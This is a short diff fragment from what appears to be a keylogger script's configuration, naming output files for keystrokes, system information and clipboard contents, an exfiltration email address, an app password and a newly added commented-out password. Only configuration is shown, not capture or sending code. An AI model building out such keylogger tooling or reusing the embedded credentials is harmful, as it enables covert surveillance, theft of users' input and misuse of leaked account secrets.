@@ -40,6 +40,7 @@ keys_information = "key_log.txt"
 system_information = "systeminfo.txt"
 clipboard_information = "clipboard.txt"
 email_address =  "keylogger4214389@gmail.com"
+#password = gr@ntColl1nsKEY##
 app_password = "ohtzogcxovolgjja"
 
 
